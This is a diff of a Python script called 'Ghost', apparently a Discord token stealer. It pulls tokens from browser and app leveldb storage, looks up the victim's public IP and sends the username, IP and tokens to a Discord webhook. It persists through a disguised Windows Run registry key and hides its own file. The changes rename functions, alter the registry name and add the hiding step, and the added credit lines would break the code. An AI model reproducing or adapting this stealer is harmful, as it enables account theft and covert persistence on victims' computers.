@@ -1,17 +1,15 @@
-# by ; github.com/f6ll
-# developed in february to april 2021
-# thank you for downloading my very first published script
-
-
 import requests, os, re, subprocess, sys, shutil
 from dhooks import Webhook, Embed
 from winreg import *
 
-class GhostProcess():
-    def __init__(self, *args, **kwargs):
-        super(GhostProcess, self).__init__(*args, **kwargs)
+by github/f6ll
+enjoy!
 
- 
+
+class Ghost():
+    def __init__(self, *args, **kwargs):
+        super(Ghost, self).__init__(*args, **kwargs)
+
 def GhostExtract(path):
     path += '\\Local Storage\\leveldb'
     tokens = []
@@ -29,9 +27,9 @@ def GhostExtract(path):
         pass
 
 
-def GhostRegistry():
-    ghostrp = (os.path.join('ghost.pyw')) 
-    ghostlgm = r'C:\ProgramData\ghost.pyw'
+def GhostFallback():
+    ghostrp = (os.path.join('ghost.py')) 
+    ghostlgm = r'C:\ProgramData\ghost.py'
     shutil.move(ghostrp,ghostlgm)
 
     fp = os.path.dirname(os.path.realpath(__file__))
@@ -39,12 +37,19 @@ def GhostRegistry():
     new_file_path = fp + '\\' + file_name
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
     key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-    SetValueEx(key2change, 'Win32githubf6llProcess', 0, REG_SZ,
+    SetValueEx(key2change, 'WinProcessTreeLeveldj', 0, REG_SZ,
                new_file_path)
+
+    ghostfile = 'ghost.py'
+    ghostopen = os.popen('attrib +h ' + ghostfile)
+    ghostread = ghostopen.read()
+    ghostopen.close()
+
 
 def GhostProcess():
     hook = Webhook("")
     user = os.getenv("UserName")
+    identity = 'Under Development, Sorry!'
     hostname = requests.get("https://api.ipify.org").text 
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
@@ -78,10 +83,10 @@ def GhostProcess():
         ctmsg = "made by https://github.com/f6ll"
 
 
-        embed = Embed(title=f' [  Ghost Logged | {user} | {hostname} |  ] ',color=16764108)
+        embed = Embed(title=f' [  Ghost Logged | {user} | {hostname} | Identifier : {identity}  ] ',color=16764108)
         embed.add_field("Creator", ctmsg)
         embed.add_field("Extracted:",message)
         hook.send(embed=embed)
         
 GhostProcess()
-GhostRegistry()
+GhostFallback()
